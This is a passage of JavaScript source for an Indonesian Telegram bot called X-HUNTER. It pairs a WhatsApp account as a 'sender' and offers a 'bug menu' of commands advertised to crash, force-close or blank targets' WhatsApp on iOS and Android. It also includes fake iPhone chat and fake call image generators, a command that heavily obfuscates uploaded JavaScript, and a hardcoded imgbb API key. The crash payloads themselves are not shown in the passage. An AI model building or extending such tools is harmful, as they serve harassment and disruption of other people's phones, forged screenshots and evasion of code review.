  if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234GINA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status Bot : Belum Terhubung
╘═——————————————═⬡
</pre></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(ThumbnailPairing, {
  caption: pairingMenu,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "SALIN CODE",
          copy_text: {
            text: formattedCode
          }
        }
      ]
    ]
  }
});

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status Bot : Sudah Terhubung
╘═——————————————═⬡
</pre></blockquote>`;

      try {
        await bot.telegram.editMessageCaption(
  lastPairingMessage.chatId,
  lastPairingMessage.messageId,
  undefined,
  updateConnectionMenu,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "SALIN CODE",
            copy_text: {
              text: lastPairingMessage.pairingCode
            }
          }
        ]
      ]
    }
  }
);
      } catch (e) {
      }
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

//---------(MIDDLEWARE PERIZINAN GROUP ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();

  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();

  const chatId = String(ctx.chat.id);

  // command khusus approval tetap boleh
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";

  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];

  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Group ini belum di-approved oleh owner untuk melanjutkan silahkan 🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }

  return next();
});
//---------(MIDDLEWARE JOIN CH ) ---------//
async function checkJoin(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(`@${CHANNEL_USERNAME}`, ctx.from.id);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (err) {
    console.log("CHECK JOIN ERROR:", err.message);
    return false;
  }
}

bot.use(async (ctx, next) => {
  try {
    if (!ctx.from) return next();

    const text = ctx.message?.text;
    if (!text) return next();

    // cuma cek kalau message command
    if (!text.startsWith("/")) return next();

    const joined = await checkJoin(ctx);

    if (!joined) {
      return ctx.reply(
        "❌ Kamu wajib join channel dulu sebelum menggunakan bot ini.",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📢 JOIN CHANNEL",
                  url: `https://t.me/${CHANNEL_USERNAME}`
                }
              ]
            ]
          }
        }
      );
    }

    return next();
  } catch (e) {
    console.log("MIDDLEWARE JOIN ERROR:", e.message);
    return ctx.reply("❌ Terjadi error saat cek akses channel.");
  }
});

//---------(MIDDLEWARE BLOCK CMD ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  // command manajemen block jangan ikut diblok oleh middleware ini
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});

// ==============================
// CONTOH COMMAND
// ==============================
// ==============================
// CONTOH COMMAND
// ==============================
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const runtimeStatus = formatRuntime();
  const premiumStatus = getPremiumStatus(ctx.from.id);
  const menuMessage = `\`\`\`js
╭────────⟦ χ-ɦųɳŧɛʀ ⟧────────╮
│✦ Developer : @Fadzzid
│✦ Version   : 15.7 
│✦ Platfrom  : Telegram
│✦ Sistem    : Auto Update 
╰─────────────────────────╯
╭───────⟦ Ɨηƒσʀмαтιση ⟧───────╮
│✦ ID-User  : ${userId}     
│✦ Username : @${ctx.from.username || "Tidak Ada"}
╰─────────────────────────╯
╭───────⟦ βơŧ Şŧąŧųʂ ⟧───────╮
│✦ Premium : ${premiumStatus}
│✦ Runtime : ${runtimeStatus}
╰─────────────────────────╯
╭─────────────────────────╮
│ Press the button below 
╰─────────────────────────╯
\`\`\``;

  const keyboard = [
        [
            { text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "/tools_menu", style: "danger" },
            { text: "ʙᴜɢ ᴍᴇɴᴜ", callback_data: "/bug_menu", style: "success" }
        ],
        [
            { text: "sᴇᴛᴛɪɴɢs ᴍᴇɴᴜ", callback_data: "/setting_menu", style: "danger" },
            { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "/tqto_for", style: "success" }
        ],
        [
            { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/FadzxGanteng", style: "Primary" },
            { text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/DaredevilXTeam", style: "Primary" }
        ]
    ];
    

   ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const runtimeStatus = formatRuntime();
  const premiumStatus = getPremiumStatus(ctx.from.id);
  const menuMessage = `\`\`\`js
╭────────⟦ χ-ɦųɳŧɛʀ ⟧────────╮
│✦ Developer : @Fadzzid
│✦ Version   : 15.7 
│✦ Platfrom  : Telegram
│✦ Sistem    : Auto Update 
╰─────────────────────────╯
╭───────⟦ Ɨηƒσʀмαтιση ⟧───────╮
│✦ ID-User  : ${userId}     
│✦ Username : @${ctx.from.username || "Tidak Ada"}
╰─────────────────────────╯
╭───────⟦ βơŧ Şŧąŧųʂ ⟧───────╮
│✦ Premium : ${premiumStatus}
│✦ Runtime : ${runtimeStatus}
╰─────────────────────────╯
╭─────────────────────────╮
│ Press the button below 
╰─────────────────────────╯
\`\`\``;

  const keyboard = [
        [
            { text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "/tools_menu", style: "danger" },
            { text: "ʙᴜɢ ᴍᴇɴᴜ", callback_data: "/bug_menu", style: "success" }
        ],
        [
            { text: "sᴇᴛᴛɪɴɢs ᴍᴇɴᴜ", callback_data: "/setting_menu", style: "danger" },
            { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "/tqto_for", style: "success" }
        ],
        [
            { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/FadzxGanteng", style: "Primary" },
            { text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/DaredevilXTeam", style: "Primary" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action("coming_soon", async (ctx) => {
  await ctx.answerCbQuery(
    "⛔ Anda Telah Di Menu Utama ⛔",
    { show_alert: true }
  );
});

bot.action("menu_akhir", async (ctx) => {
  await ctx.answerCbQuery(
    "⛔ Anda Telah Di Menu Akhir ⛔",
    { show_alert: true }
  );
});

bot.action('/bug_menu', async (ctx) => {
  const bug_menuMenu = `\`\`\`js
╭━━━━━〔 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〕━━━━━━╮
│⌬ /tutixsix ➜ ᴅᴇʟᴀʏ ʜᴀʀᴅ
│⌬ /hunter ➜ ғᴄ ɪᴏs ᴘᴇʀᴍᴀɴᴇɴ
│⌬ /hunterx ➜ ᴄʀᴀsʜ ᴀɴᴅʀᴏ
│⌬ /xhunter ➜ ʙʟᴀɴᴋ ᴀɴᴅʀᴏ++
│⌬ /hunterfadzx ➜ ғᴏʀᴄʟᴏsᴇ ɴᴏ ᴄʟɪᴄᴋ
│⌬ /hunterxfadzx ➜ ᴄʀᴀsʜ ɪᴏs
╰━━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

    const keyboard = [
        [
            { text: "ʙᴜɢ ᴠ2", callback_data: "/invisible_bug", style: "danger" },
        ],
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "Primary" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/invisible_bug', async (ctx) => {
  const invisible_bugMenu = `\`\`\`js
╭━━━━━〔 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 〕━━━━━╮
│⌬ /xfadzx ➜ ʙᴇʙᴀs sᴘᴀᴍ
│⌬ /xdelay ➜ ʙᴇʙᴀs sᴘᴀᴍ
│⌬ /xmbut ➜ ʙᴇʙᴀs sᴘᴀᴍ
│⌬ /xioszx ➜ ʙᴇʙᴀs sᴘᴀᴍ 
│⌬ /xbulzx ➜ ʙᴇʙᴀs sᴘᴀᴍ
╰━━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

    const keyboard = [
        [
            { text: "ɴᴇxᴛ", callback_data: "/infoup", style: "danger" },
        ],
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "Primary" }
        ]
    ];

    try {
        await ctx.editMessageCaption(invisible_bugMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di invisible_bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/infoup', async (ctx) => {
  const infoupMenu = `\`\`\`js
╭━━━━━〔 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 〕━━━━━╮
│☇ 1. NEW COMMAND /testfunction
│☇ 2. NEW TOOLS /cekemoji
│☇ 3. NEW TOOLS /CheckError
│☇ 4. NEW TOOLS /fixerror
│☇ 5. FIX FUNC GA WORK
│
│ ALL MENU BUG V2 BEBAS SPAM
│ SARAN SET COOLDOWN 3 DETIK
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(infoupMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di infoup menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/setting_menu', async (ctx) => {
  const setting_menuMenu = `\`\`\`js
╭━━━━〔 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 𝗠𝗘𝗡𝗨 〕━━━━╮
│𖥚 /update - ᴜᴘᴅᴀᴛᴇ sᴄʀɪᴘᴛ ᴋᴇ ᴠ ᴛᴇʀʙᴀʀᴜ 
│𖥚 /addpremgrup - ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ ɢʀᴏᴜᴘ
│𖥚 /delpremgrup - ʜᴀᴘᴜs ᴘʀᴇᴍɪᴜᴍ ɢʀᴏᴜᴘ 
│𖥚 /listpremgrup - ʟɪsᴛ ᴘʀᴇᴍɪᴜᴍ ɢʀᴏᴜᴘ 
│𖥚 /addpairing - ᴀᴅᴅ sᴇɴᴅᴇʀ
│𖥚 /killsession - ʜᴀᴘᴜs sᴇɴᴅᴇʀ
│𖥚 /approved - ɪᴢɪɴ ᴋᴀɴ ɢʀᴏᴜᴘ 
│𖥚 /unapproved - ʜᴀᴘᴜs ɪᴢɪɴ ɢʀᴏᴜᴘ 
│𖥚 /listapprovedgroup - ʟɪsᴛ ɢʀᴏᴜᴘ ʏᴀɴɢ ᴅɪ ɪᴢɪɴᴋᴀɴ
│𖥚 /blockcmd - ᴋᴜɴᴄɪ ᴄᴍᴅ
│𖥚 /unblockcmd - ʙᴜᴋᴀ ᴋᴜɴᴄɪ ᴄᴍᴅ
│𖥚 /setcd - sᴇᴛ ᴄᴏᴏʟᴅᴏᴡɴ ʙᴜɢ
╰━━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "Primary" }
        ]
    ];

    try {
        await ctx.editMessageCaption(setting_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di setting_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
}); 

bot.action('/tools_menu', async (ctx) => {
  const tools_menuMenu = `\`\`\`js
╭━━━━━〔 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 〕━━━━━╮
│✠ /coming soon - coming soon
│✠ /coming soon - coming soon
│✠ /testfunction - ᴛᴇs ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ
│✠ /addpairing - ᴀᴅᴅ sᴇɴᴅᴇʀ
│✠ /killsession - ʜᴀᴘᴜs sᴇɴᴅᴇʀ
│✠ /fixerror - ғɪx ᴇʀʀᴏʀ ᴊᴀᴠᴀsᴄʀɪᴘᴛ 
│✠ /CheckError - ᴄᴇᴋ ᴇʀʀᴏʀ ᴊᴀᴠᴀsᴄʀɪᴘᴛ 
│✠ /cekemoji - ᴄᴇᴋ ᴇᴍᴏᴊɪ ᴘʀᴇᴍɪᴜᴍ 
│✠ / - ??
│✠ / - ??
╰━━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(tools_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tools_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/tqto_for', async (ctx) => {
    const tqto_forMenu = `
